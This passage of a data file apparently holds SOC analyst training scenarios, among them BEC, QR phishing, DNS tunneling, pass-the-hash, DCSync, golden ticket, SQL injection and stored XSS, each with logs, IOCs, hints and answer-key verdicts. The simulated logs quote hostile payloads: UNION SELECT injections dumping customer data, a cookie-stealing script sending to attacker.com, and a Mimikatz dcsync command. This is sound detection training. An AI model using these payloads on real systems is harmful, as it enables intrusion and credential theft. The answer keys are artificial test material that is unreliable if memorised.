    "host_info": json.dumps({"hostname": "MAIL-GW01", "os": "ProofPoint Email Security", "ip": "10.10.0.25", "service": "Email Gateway", "dmarc_policy": "p=quarantine", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "p.white", "domain": "CORP", "department": "Finance", "wire_transfer_authority": True, "position": "AP Specialist", "contacted_ceo": "CEO confirmed did NOT send email"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1566.002", "name": "Phishing: Spear phishing Link", "url": "https://attack.mitre.org/techniques/T1566/002/"}),
    "logs": [
        {"log_type": "email", "timestamp": "2024-12-15 09:14:22", "source_ip": "209.85.220.41", "dest_ip": "10.10.0.25", "username": "p.white@corp.com", "event_id": "EMAIL-RECEIVED", "raw_log": "ProofPoint | DELIVERED | From: ceo@corp-inc.com | Display-Name: 'CEO Name <ceo@corp.com>' | To: p.white@corp.com | Subject: URGENT: Wire Transfer Required Today | SPF: PASS (corp-inc.com) | DMARC: FAIL (domain mismatch) | Lookalike Domain Score: 94/100", "highlighted": 1},
        {"log_type": "email", "timestamp": "2024-12-15 09:14:22", "source_ip": "209.85.220.41", "dest_ip": "10.10.0.25", "username": "p.white@corp.com", "event_id": "EMAIL-BODY", "raw_log": "EMAIL BODY EXCERPT: 'Patricia, I need you to process an urgent wire transfer of $247,000 to our new vendor before EOD. This is time-sensitive and confidential. Do not discuss with anyone. Account: First National Bank, Routing: 021000089, Account: 4847392847' | URGENCY LANGUAGE | SECRECY REQUEST | UNUSUAL VENDOR", "highlighted": 1},
        {"log_type": "email", "timestamp": "2024-12-15 09:31:00", "source_ip": "10.10.2.88", "dest_ip": "209.85.220.41", "username": "p.white@corp.com", "event_id": "EMAIL-REPLY", "raw_log": "ProofPoint | OUTBOUND | From: p.white@corp.com | To: ceo@corp-inc.com | Subject: RE: URGENT: Wire Transfer Required Today | Body: 'I can process this, can you confirm the vendor name?' | REPLY TO ATTACKER DOMAIN", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "corp-inc.com", "description": "BEC lookalike domain - registered 3 days ago", "malicious": 1},
        {"ioc_type": "email", "value": "ceo@corp-inc.com", "description": "CEO impersonation sender address", "malicious": 1},
        {"ioc_type": "ip", "value": "209.85.220.41", "description": "Google SMTP relay used to send phishing", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-12 00:00:00", "event_type": "Domain Registered", "description": "corp-inc.com registered 3 days before attack", "source": "Threat Intel", "severity": "high"},
        {"event_time": "2024-12-15 09:14:22", "event_type": "Email Delivered", "description": "BEC email delivered despite DMARC fail (policy=quarantine not reject)", "source": "ProofPoint", "severity": "critical"},
        {"event_time": "2024-12-15 09:31:00", "event_type": "Victim Reply", "description": "Finance employee replied to attacker - engaged", "source": "Email Gateway", "severity": "critical"},
    ]
},

{
    "title": "Phishing Email with Malicious PDF - Credential Harvest",
    "category": "Phishing",
    "severity": "high",
    "description": "Phishing email with PDF attachment containing QR code linking to Office 365 credential harvesting page. 12 employees scanned the QR code with their phones.",
    "source": "Microsoft Defender for Office 365",
    "source_ip": "198.54.117.197",
    "dest_ip": "10.10.0.25",
    "hostname": "MAIL-GW01",
    "username": "multiple",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "QR code phishing (Quishing) bypasses email URL scanners. Check mobile device logs for the actual URL resolved from QR code.",
    "solution_explanation": "True positive QR code phishing campaign. PDF with QR code bypassed email URL scanning. Employees scanned with phones on cellular (outside DLP). Reset credentials and enable MFA.",
    "host_info": json.dumps({"hostname": "MAIL-GW01 / Mobile Devices", "service": "Email + Mobile MDM", "affected_users": 12, "criticality": "High"}),
    "user_info": json.dumps({"username": "12 employees", "qr_scanned": ["r.garcia", "t.lee", "s.patel", "9 others"], "credentials_entered": "Unknown - check Azure AD logs"}),
    "mitre_mapping": json.dumps({"tactic": "Initial Access", "technique": "T1566.001", "name": "Phishing: Spear phishing Attachment", "url": "https://attack.mitre.org/techniques/T1566/001/"}),
    "logs": [
        {"log_type": "email", "timestamp": "2024-12-15 11:30:00", "source_ip": "198.54.117.197", "dest_ip": "10.10.0.25", "username": "multiple", "event_id": "EMAIL-RECEIVED", "raw_log": "MDO365 | DELIVERED | From: noreply@microsoft-update.net | Subject: 'Action Required: Verify Your Microsoft 365 Account' | Attachment: AccountVerification.pdf (89KB) | URLs in attachment: 0 (QR code only) | Safe Links: NO URLs TO SCAN | Delivered to 47 recipients", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 11:45:22", "source_ip": "172.16.0.0", "dest_ip": "45.12.34.56", "username": "r.garcia", "event_id": "", "raw_log": "MDM Zscaler | Mobile Device: iPhone-rgarcia | URL: https://ms-verify-account.com/login?tenant=corp&redirect=sharepoint | Category: Phishing | Action: ALLOWED (mobile data, not proxy)", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 11:46:00", "source_ip": "45.12.34.56", "dest_ip": "", "username": "r.garcia@corp.com", "event_id": "CREDENTIAL_HARVEST", "raw_log": "Threat Intel Feed | ms-verify-account.com | Category: Credential Harvester | Mimics: Microsoft O365 Login | Operator: EvilGinx2 Proxy | Captures: Username, Password, MFA Token", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "ms-verify-account.com", "description": "O365 credential harvesting page (EvilGinx2)", "malicious": 1},
        {"ioc_type": "domain", "value": "microsoft-update.net", "description": "Phishing sender domain", "malicious": 1},
        {"ioc_type": "filename", "value": "AccountVerification.pdf", "description": "PDF with QR code leading to phishing site", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 11:30:00", "event_type": "Phishing Delivered", "description": "PDF phishing email delivered to 47 recipients", "source": "Email Gateway", "severity": "high"},
        {"event_time": "2024-12-15 11:45:00", "event_type": "QR Scanned", "description": "First employee scans QR code - bypasses email security", "source": "MDM", "severity": "critical"},
        {"event_time": "2024-12-15 11:46:00", "event_type": "Credential Harvesting", "description": "EvilGinx2 AiTM proxy captures credentials+MFA", "source": "Threat Intel", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# NETWORK SECURITY (20 scenarios)
# ════════════════════════════════════════

{
    "title": "Port Scan - Nmap SYN Scan Detected",
    "category": "Network Security",
    "severity": "medium",
    "description": "Nmap SYN scan detected from external IP scanning 65535 ports on DMZ web server. 1,024 SYN packets per second with no corresponding SYN-ACK responses from scanner.",
    "source": "Palo Alto Firewall / Suricata",
    "source_ip": "203.0.113.15",
    "dest_ip": "10.10.5.200",
    "hostname": "DMZ-WEB01",
    "username": "",
    "expected_verdict": "true_positive",
    "points": 100,
    "hint": "Look at TCP flag patterns. SYN scan sends SYN and immediately RST after SYN-ACK. Check open ports discovered.",
    "solution_explanation": "True positive port scan reconnaissance. Nmap SYN scan from external IP mapped open services on DMZ server. Block IP and review discovered open ports for unnecessary exposure.",
    "host_info": json.dumps({"hostname": "DMZ-WEB01", "os": "Ubuntu 22.04", "ip": "10.10.5.200", "exposed_services": ["80/HTTP", "443/HTTPS", "22/SSH", "8080/HTTP-ALT"], "criticality": "Medium"}),
    "user_info": json.dumps({"username": "N/A", "note": "No user account involved - external reconnaissance"}),
    "mitre_mapping": json.dumps({"tactic": "Reconnaissance", "technique": "T1046", "name": "Network Service Discovery", "url": "https://attack.mitre.org/techniques/T1046/"}),
    "logs": [
        {"log_type": "firewall", "timestamp": "2024-12-15 03:00:00", "source_ip": "203.0.113.15", "dest_ip": "10.10.5.200", "username": "", "event_id": "", "raw_log": "SURICATA | ALERT | ET SCAN Nmap SYN Scan | SRC: 203.0.113.15 | DST: 10.10.5.200 | TCP Flags: SYN | Rate: 1024 pps | Signature: 2000537", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 03:00:01", "source_ip": "203.0.113.15", "dest_ip": "10.10.5.200", "username": "", "event_id": "", "raw_log": "PALO ALTO | THREAT | Port Scan | 203.0.113.15 -> 10.10.5.200 | Ports scanned: 1-65535 | Duration: 64s | GEO: CN | ASN: AS4134 China Telecom", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 03:01:04", "source_ip": "203.0.113.15", "dest_ip": "10.10.5.200", "username": "", "event_id": "", "raw_log": "SCAN RESULTS: Open ports discovered: 22/SSH, 80/HTTP, 443/HTTPS, 8080/HTTP-ALT | 8080 should NOT be open per security policy | Scan complete in 64 seconds", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "203.0.113.15", "description": "Nmap scanner IP - China Telecom", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 03:00:00", "event_type": "Scan Start", "description": "External Nmap SYN scan begins on DMZ-WEB01", "source": "Suricata", "severity": "medium"},
        {"event_time": "2024-12-15 03:01:04", "event_type": "Scan Complete", "description": "Port scan complete - 4 open ports discovered including unauthorized 8080", "source": "Firewall", "severity": "high"},
    ]
},

{
    "title": "DNS Tunneling - Data Exfiltration via DNS",
    "category": "Network Security",
    "severity": "high",
    "description": "Anomalous DNS query volume from workstation. 15,000 DNS TXT queries to subdomains of tunnel.c2server.com in 1 hour. Query lengths exceed 100 characters - data encoding detected.",
    "source": "DNS Server / Zeek",
    "source_ip": "10.10.2.44",
    "dest_ip": "8.8.8.8",
    "hostname": "WKSTN-SALES03",
    "username": "k.johnson",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "DNS tunneling uses TXT records with unusually long subdomains to encode data. Look for high entropy in subdomain labels.",
    "solution_explanation": "True positive DNS tunneling using Iodine or DNScat2. TXT record queries with base64-encoded data in subdomains indicate C2 or data exfiltration channel over DNS. Block domain at DNS resolver level.",
    "host_info": json.dumps({"hostname": "WKSTN-SALES03", "os": "Windows 10", "ip": "10.10.2.44", "dns_queries_normal_baseline": "200/hour", "criticality": "Medium"}),
    "user_info": json.dumps({"username": "k.johnson", "domain": "CORP", "department": "Sales", "data_access": "CRM, customer database"}),
    "mitre_mapping": json.dumps({"tactic": "Command and Control", "technique": "T1071.004", "name": "Application Layer Protocol: DNS", "url": "https://attack.mitre.org/techniques/T1071/004/"}),
    "logs": [
        {"log_type": "firewall", "timestamp": "2024-12-15 14:00:00", "source_ip": "10.10.2.44", "dest_ip": "8.8.8.8", "username": "k.johnson", "event_id": "", "raw_log": "DNS | TXT Query | 10.10.2.44 | aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.tunnel.c2server.com | Type: TXT | Length: 112 chars | ANOMALY: avg=23 chars", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 14:00:01", "source_ip": "10.10.2.44", "dest_ip": "8.8.8.8", "username": "k.johnson", "event_id": "", "raw_log": "DNS | TXT Query #2 | dGhpcyBpcyBlbmNvZGVkIGRhdGEgaW4gYmFzZTY0.tunnel.c2server.com | TXT Response: 512 bytes | HIGH ENTROPY SUBDOMAIN", "highlighted": 1},
        {"log_type": "firewall", "timestamp": "2024-12-15 15:00:00", "source_ip": "10.10.2.44", "dest_ip": "8.8.8.8", "username": "k.johnson", "event_id": "", "raw_log": "ZEEK DNS Summary | 10.10.2.44 | Queries to tunnel.c2server.com: 15,342 (1 hour) | Types: 98% TXT | Avg subdomain length: 87 chars | Estimated data: 7.8 MB | ALERT: DNS Tunneling Pattern", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "domain", "value": "tunnel.c2server.com", "description": "DNS tunneling C2 domain", "malicious": 1},
        {"ioc_type": "ip", "value": "10.10.2.44", "description": "Infected workstation originating DNS tunnel", "malicious": 0},
    ],
    "timeline": [
        {"event_time": "2024-12-15 14:00:00", "event_type": "Tunnel Start", "description": "DNS TXT queries with base64 subdomains begin", "source": "DNS Log", "severity": "high"},
        {"event_time": "2024-12-15 14:30:00", "event_type": "Data Transfer", "description": "7,500 TXT queries - estimated 3.9 MB data transferred", "source": "DNS/Zeek", "severity": "critical"},
        {"event_time": "2024-12-15 15:00:00", "event_type": "Detection", "description": "Zeek DNS analytics detects tunneling pattern - 15,342 queries", "source": "Zeek", "severity": "critical"},
    ]
},

{
    "title": "Lateral Movement - Pass-the-Hash Attack",
    "category": "Network Security",
    "severity": "critical",
    "description": "NTLM authentication from WKSTN-HR01 to multiple servers using the hash of a privileged account. No corresponding password authentication for that account. Pass-the-Hash technique confirmed.",
    "source": "Windows Security Event Log",
    "source_ip": "10.10.4.11",
    "dest_ip": "10.10.0.10",
    "hostname": "FILESERVER01",
    "username": "svc_admin",
    "expected_verdict": "true_positive",
    "points": 225,
    "hint": "Pass-the-Hash shows LogonType 3 (network) with NTLM auth from unusual source. The account authenticates without knowing the actual password.",
    "solution_explanation": "True positive Pass-the-Hash lateral movement. svc_admin hash was extracted (likely via Mimikatz) and used for NTLM authentication to file servers and the DC. Immediate credential rotation and forensics required.",
    "host_info": json.dumps({"hostname": "Multiple servers", "lateral_movement_targets": ["FILESERVER01", "DC01", "SQLSERVER01"], "criticality": "Critical"}),
    "user_info": json.dumps({"username": "svc_admin", "domain": "CORP", "privileges": "Domain Admin equivalent", "normal_logon_source": "MGMT-SERVER01 only", "anomaly": "Authenticating from HR workstation"}),
    "mitre_mapping": json.dumps({"tactic": "Lateral Movement", "technique": "T1550.002", "name": "Use Alternate Authentication Material: Pass the Hash", "url": "https://attack.mitre.org/techniques/T1550/002/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 15:30:22", "source_ip": "10.10.4.11", "dest_ip": "10.10.0.10", "username": "svc_admin", "event_id": "4624", "raw_log": "EventID: 4624 | Logon Type: 3 (Network) | Account: CORP\\svc_admin | Auth Package: NTLM | Workstation: WKSTN-HR01 | Source IP: 10.10.4.11 | ANOMALY: svc_admin never logs from HR workstation", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 15:30:23", "source_ip": "10.10.4.11", "dest_ip": "10.10.0.5", "username": "svc_admin", "event_id": "4624", "raw_log": "EventID: 4624 | Logon Type: 3 | Account: CORP\\svc_admin | Auth: NTLM | Source: WKSTN-HR01 | Target: DC01 | DC access from HR workstation is HIGHLY UNUSUAL", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 15:28:00", "source_ip": "10.10.4.11", "dest_ip": "", "username": "h.brown", "event_id": "EDR-CRITICAL", "raw_log": "CrowdStrike | DETECT | LSASS Memory Read | Process: mimikatz.exe (renamed to svchost32.exe) | Target: lsass.exe | Credentials extracted: CORP\\svc_admin NTLM hash | Host: WKSTN-HR01", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "filename", "value": "svchost32.exe", "description": "Mimikatz renamed to evade detection", "malicious": 1},
        {"ioc_type": "hash", "value": "aad3b435b51404eeaad3b435b51404ee:c4e4f97c3be8b2e22b4f2e2e96c1f9b3", "description": "NTLM hash of svc_admin account", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 15:28:00", "event_type": "Credential Theft", "description": "Mimikatz executed on WKSTN-HR01 - svc_admin NTLM hash extracted", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 15:30:22", "event_type": "Pass-the-Hash", "description": "NTLM authentication to FILESERVER01 using stolen hash", "source": "Windows Security", "severity": "critical"},
        {"event_time": "2024-12-15 15:30:23", "event_type": "DC Access", "description": "Lateral movement reaches Domain Controller", "source": "Windows Security", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# ACTIVE DIRECTORY (20 scenarios)
# ════════════════════════════════════════

{
    "title": "DCSync Attack - AD Replication Abuse",
    "category": "Active Directory",
    "severity": "critical",
    "description": "Non-domain controller machine initiated AD replication requests using DS-Replication-Get-Changes-All permissions. All NTLM hashes potentially dumped from Active Directory.",
    "source": "Windows Security Event Log / DC01",
    "source_ip": "10.10.3.100",
    "dest_ip": "10.10.0.5",
    "hostname": "DC01",
    "username": "corp_admin",
    "expected_verdict": "true_positive",
    "points": 250,
    "hint": "Event ID 4662 with 'Control Access' and specific GUID for DS-Replication-Get-Changes-All from a non-DC is the DCSync signature.",
    "solution_explanation": "True positive DCSync attack. corp_admin account initiated AD replication from a workstation - not a domain controller. All credentials in Active Directory must be considered compromised. Full IR response required.",
    "host_info": json.dumps({"hostname": "DC01", "os": "Windows Server 2022", "ip": "10.10.0.5", "role": "Primary Domain Controller", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "corp_admin", "domain": "CORP", "privileges": "Domain Admin", "source_host": "WKSTN-DEV04 (NOT a DC)", "anomaly": "Replication from non-DC is DCSync"}),
    "mitre_mapping": json.dumps({"tactic": "Credential Access", "technique": "T1003.006", "name": "OS Credential Dumping: DCSync", "url": "https://attack.mitre.org/techniques/T1003/006/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 22:10:00", "source_ip": "10.10.3.100", "dest_ip": "10.10.0.5", "username": "corp_admin", "event_id": "4662", "raw_log": "EventID: 4662 | Directory Service Access | Object: CN=CORP,DC=corp,DC=local | Access: Control Access | Property: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (DS-Replication-Get-Changes-All) | Account: CORP\\corp_admin | Client: 10.10.3.100 (WKSTN-DEV04) | ALERT: Non-DC replication request", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 22:10:01", "source_ip": "10.10.3.100", "dest_ip": "10.10.0.5", "username": "corp_admin", "event_id": "4662", "raw_log": "EventID: 4662 | DS-Replication-Get-Changes | 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 | Replication of all objects including krbtgt and domain admin hashes | Source: WKSTN-DEV04 | Tool: Mimikatz lsadump::dcsync", "highlighted": 1},
        {"log_type": "edr", "timestamp": "2024-12-15 22:09:55", "source_ip": "10.10.3.100", "dest_ip": "", "username": "corp_admin", "event_id": "EDR-CRITICAL", "raw_log": "CrowdStrike | DETECT | DCSync | mimikatz.exe - lsadump::dcsync /domain:corp.local /all | Executed by: corp_admin | Host: WKSTN-DEV04 | KRBTGT hash extraction detected", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.3.100", "description": "WKSTN-DEV04 - DCSync origin workstation", "malicious": 1},
        {"ioc_type": "hash", "value": "krbtgt_hash_COMPROMISED", "description": "KRBTGT hash potentially extracted - Golden Ticket risk", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 22:09:55", "event_type": "DCSync Initiated", "description": "Mimikatz lsadump::dcsync executed on WKSTN-DEV04", "source": "EDR", "severity": "critical"},
        {"event_time": "2024-12-15 22:10:00", "event_type": "AD Replication", "description": "DS-Replication-Get-Changes-All access from non-DC", "source": "DC01 Event Log", "severity": "critical"},
        {"event_time": "2024-12-15 22:10:01", "event_type": "Hash Dump", "description": "KRBTGT and all domain hashes potentially extracted", "source": "DC01 Event Log", "severity": "critical"},
    ]
},

{
    "title": "Golden Ticket Attack - Forged Kerberos Ticket",
    "category": "Active Directory",
    "severity": "critical",
    "description": "Kerberos ticket with anomalous properties detected: 10-year lifetime, non-standard encryption, and ticket issued for an account that has no corresponding logon event. Indicates Golden Ticket.",
    "source": "Windows Security Event Log",
    "source_ip": "10.10.5.50",
    "dest_ip": "10.10.0.5",
    "hostname": "DC01",
    "username": "krbtgt",
    "expected_verdict": "true_positive",
    "points": 250,
    "hint": "Golden Ticket indicators: ticket lifetime >10 hours, forged PAC, no corresponding TGT request (Event 4768), and account claims to be a privileged user.",
    "solution_explanation": "True positive Golden Ticket attack. Forged Kerberos TGT using compromised KRBTGT hash. Reset KRBTGT password TWICE immediately and conduct full AD forensics.",
    "host_info": json.dumps({"hostname": "DC01", "os": "Windows Server 2022", "ip": "10.10.0.5", "role": "Domain Controller", "criticality": "Critical"}),
    "user_info": json.dumps({"username": "administrator (forged)", "ticket_domain": "CORP.LOCAL", "ticket_lifetime": "3650 days (10 years)", "anomaly": "No Event 4768 TGT request matches this ticket"}),
    "mitre_mapping": json.dumps({"tactic": "Privilege Escalation", "technique": "T1558.001", "name": "Steal or Forge Kerberos Tickets: Golden Ticket", "url": "https://attack.mitre.org/techniques/T1558/001/"}),
    "logs": [
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:00:00", "source_ip": "10.10.5.50", "dest_ip": "10.10.0.5", "username": "administrator", "event_id": "4769", "raw_log": "EventID: 4769 | TGS Request | Account: administrator | Ticket options: 0x40800010 | Ticket Lifetime: 3,650 days | Encryption: 0x17 RC4 | Source: 10.10.5.50 | ANOMALY: Admin TGT lifetime is 10 hours max by policy", "highlighted": 1},
        {"log_type": "windows_event", "timestamp": "2024-12-15 23:00:00", "source_ip": "10.10.5.50", "dest_ip": "10.10.0.5", "username": "administrator", "event_id": "4672", "raw_log": "EventID: 4672 | Special Logon | Account: administrator | Privileges: SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege (ALL privileges) | NO CORRESPONDING 4768 TGT request found | FORGED TICKET INDICATOR", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "10.10.5.50", "description": "Golden Ticket use origin", "malicious": 1},
        {"ioc_type": "hash", "value": "krbtgt_NTLM_compromised", "description": "KRBTGT NTLM hash used to forge tickets", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 22:10:00", "event_type": "KRBTGT Compromised", "description": "KRBTGT hash extracted via DCSync (see related alert)", "source": "DC01", "severity": "critical"},
        {"event_time": "2024-12-15 23:00:00", "event_type": "Golden Ticket Used", "description": "Forged TGT with 10-year lifetime used for domain access", "source": "DC01", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# WEB ATTACKS (20 scenarios)
# ════════════════════════════════════════

{
    "title": "SQL Injection - Database Exfiltration Attempt",
    "category": "Web Attacks",
    "severity": "critical",
    "description": "SQL injection attack detected against customer portal login page. Union-based SQLi confirmed, attacker extracted database schema and began dumping customer table with 450,000 records.",
    "source": "WAF / Web Server Logs",
    "source_ip": "91.108.4.200",
    "dest_ip": "10.20.5.100",
    "hostname": "WEB-PORTAL01",
    "username": "anonymous",
    "expected_verdict": "true_positive",
    "points": 200,
    "hint": "Look for UNION SELECT in URL parameters or POST body. Check HTTP response sizes - larger responses indicate successful data extraction.",
    "solution_explanation": "True positive SQL injection with data exfiltration. UNION-based SQLi bypassed input validation. Customer PII exposure likely. Patch immediately, notify DPO for breach assessment.",
    "host_info": json.dumps({"hostname": "WEB-PORTAL01", "os": "Ubuntu 22.04 / MySQL 8.0", "ip": "10.20.5.100", "db_tables": ["customers", "orders", "payments"], "criticality": "Critical", "records_at_risk": 450000}),
    "user_info": json.dumps({"username": "anonymous", "attack_origin": "91.108.4.200", "geo": "Netherlands (VPN likely)"}),
    "mitre_mapping": json.dumps({"tactic": "Collection", "technique": "T1213", "name": "Data from Information Repositories", "url": "https://attack.mitre.org/techniques/T1213/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 16:22:11", "source_ip": "91.108.4.200", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "200", "raw_log": "91.108.4.200 - - [15/Dec/2024:16:22:11] \"GET /login?user=admin'+UNION+SELECT+1,2,3,4,5--+- HTTP/1.1\" 200 4521 | SQLI PROBE: Union test", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 16:22:44", "source_ip": "91.108.4.200", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "200", "raw_log": "91.108.4.200 - - \"GET /login?user='+UNION+SELECT+table_name,2,3,4,5+FROM+information_schema.tables--\" 200 8924 | Response size: 8924 bytes (normal: 1200) | SCHEMA EXTRACTED", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 16:25:00", "source_ip": "91.108.4.200", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "200", "raw_log": "91.108.4.200 - - \"GET /login?user='+UNION+SELECT+email,password,name,phone,cc_number+FROM+customers+LIMIT+1000+OFFSET+0--\" 200 524288 | Response: 512KB | CUSTOMER DATA EXFILTRATION IN PROGRESS", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 16:22:10", "source_ip": "91.108.4.200", "dest_ip": "10.20.5.100", "username": "anonymous", "event_id": "WAF-ALERT", "raw_log": "MODSECURITY | ALERT | SQL Injection Detected | Rule: 942100 | Request: /login | Payload: admin'+UNION+SELECT | Action: DETECT (not block - WAF in detection mode) | SEVERITY: CRITICAL", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "91.108.4.200", "description": "SQL injection attacker IP", "malicious": 1},
        {"ioc_type": "url", "value": "https://portal.corp.com/login?user='+UNION+SELECT", "description": "SQLi payload URL", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 16:22:10", "event_type": "SQLi Probe", "description": "WAF detects first SQL injection attempt - detection mode only", "source": "WAF/ModSecurity", "severity": "high"},
        {"event_time": "2024-12-15 16:22:11", "event_type": "Union Test", "description": "UNION SELECT column count enumeration successful", "source": "Nginx", "severity": "critical"},
        {"event_time": "2024-12-15 16:22:44", "event_type": "Schema Dump", "description": "information_schema.tables dumped - DB structure exposed", "source": "Nginx", "severity": "critical"},
        {"event_time": "2024-12-15 16:25:00", "event_type": "Data Exfiltration", "description": "Customer PII exfiltration in progress - 512KB responses", "source": "Nginx", "severity": "critical"},
    ]
},

{
    "title": "XSS Attack - Stored Cross-Site Scripting",
    "category": "Web Attacks",
    "severity": "high",
    "description": "Stored XSS payload injected into product comment field. Malicious script steals session cookies from all users viewing the product page. 234 users affected.",
    "source": "Web Application Firewall / App Logs",
    "source_ip": "77.88.55.80",
    "dest_ip": "10.20.5.100",
    "hostname": "WEB-SHOP01",
    "username": "guest_user",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Stored XSS persists in the database and affects ALL users viewing the page. Look for script tags in form submissions and data exfiltration to external URLs.",
    "solution_explanation": "True positive stored XSS. Cookie-stealing script stored in product comments affects all site visitors. Invalidate all active sessions, patch input sanitization, notify affected users.",
    "host_info": json.dumps({"hostname": "WEB-SHOP01", "os": "Ubuntu 22.04 / PHP 8.1", "ip": "10.20.5.100", "framework": "Custom PHP", "affected_users": 234, "criticality": "High"}),
    "user_info": json.dumps({"username": "guest_user (attacker)", "affected_users": "234 legitimate users viewed infected page"}),
    "mitre_mapping": json.dumps({"tactic": "Collection", "technique": "T1185", "name": "Browser Session Hijacking", "url": "https://attack.mitre.org/techniques/T1185/"}),
    "logs": [
        {"log_type": "web", "timestamp": "2024-12-15 10:14:00", "source_ip": "77.88.55.80", "dest_ip": "10.20.5.100", "username": "guest_user", "event_id": "200", "raw_log": "POST /product/1234/comment HTTP/1.1 | Body: comment=Great+product!<script>fetch('https://attacker.com/steal?c='+document.cookie)</script> | Response: 200 | Comment stored in DB without sanitization", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 10:30:00", "source_ip": "10.10.4.55", "dest_ip": "attacker.com", "username": "legitimate_user", "event_id": "200", "raw_log": "GET https://attacker.com/steal?c=sessionid=abc123;auth=eyJhbGciOiJIUzI1NiJ9... | Victim cookie exfiltrated from: 10.10.4.55 | XSS payload executed on victim browser", "highlighted": 1},
        {"log_type": "web", "timestamp": "2024-12-15 10:30:00", "source_ip": "", "dest_ip": "", "username": "", "event_id": "SUMMARY", "raw_log": "XSS IMPACT SUMMARY | Payload stored at: 10:14 | First victim: 10:22 | Total victims: 234 | Cookies stolen: 234 | Attacker collection server: attacker.com | Sessions at risk: ALL 234", "highlighted": 1},
    ],
    "iocs": [
        {"ioc_type": "ip", "value": "77.88.55.80", "description": "XSS attacker origin IP", "malicious": 1},
        {"ioc_type": "domain", "value": "attacker.com", "description": "Cookie exfiltration server", "malicious": 1},
        {"ioc_type": "url", "value": "https://attacker.com/steal", "description": "XSS payload exfiltration endpoint", "malicious": 1},
    ],
    "timeline": [
        {"event_time": "2024-12-15 10:14:00", "event_type": "XSS Injected", "description": "Malicious script stored in product comment DB", "source": "App Log", "severity": "high"},
        {"event_time": "2024-12-15 10:22:00", "event_type": "First Victim", "description": "First user views infected product page - script executes", "source": "App Log", "severity": "critical"},
        {"event_time": "2024-12-15 10:30:00", "event_type": "Mass Theft", "description": "234 session cookies exfiltrated to attacker.com", "source": "Web Log", "severity": "critical"},
    ]
},

# ════════════════════════════════════════
# DATA EXFILTRATION (15 scenarios)
# ════════════════════════════════════════

{
    "title": "Data Exfiltration - Large File Upload to Personal Cloud",
    "category": "Data Exfiltration",
    "severity": "high",
    "description": "Finance employee uploaded 4.2GB of files to personal Google Drive account from corporate workstation. Files include spreadsheets with 'payroll', 'salary', 'confidential' in filenames.",
    "source": "Netskope CASB / DLP",
    "source_ip": "10.10.2.33",
    "dest_ip": "142.250.185.78",
    "hostname": "WKSTN-FIN04",
    "username": "c.martinez",
    "expected_verdict": "true_positive",
    "points": 175,
    "hint": "Check the DLP policy violations and file names. Payroll data to personal cloud is a policy violation regardless of intent.",
    "solution_explanation": "True positive data exfiltration. Employee c.martinez uploaded sensitive HR/Finance data to personal Google Drive. Could be deliberate IP theft or policy violation. Immediate DLP enforcement and HR notification required.",
    "host_info": json.dumps({"hostname": "WKSTN-FIN04", "os": "Windows 10", "ip": "10.10.2.33", "dept": "Finance", "criticality": "High", "dlp_policy": "Block personal cloud uploads"}),
    "user_info": json.dumps({"username": "c.martinez", "department": "Finance", "notice_period": "Submitted resignation 2 weeks ago", "data_uploaded": "4.2GB payroll and HR files"}),
    "mitre_mapping": json.dumps({"tactic": "Exfiltration", "technique": "T1567.002", "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage", "url": "https://attack.mitre.org/techniques/T1567/002/"}),
    "logs": [
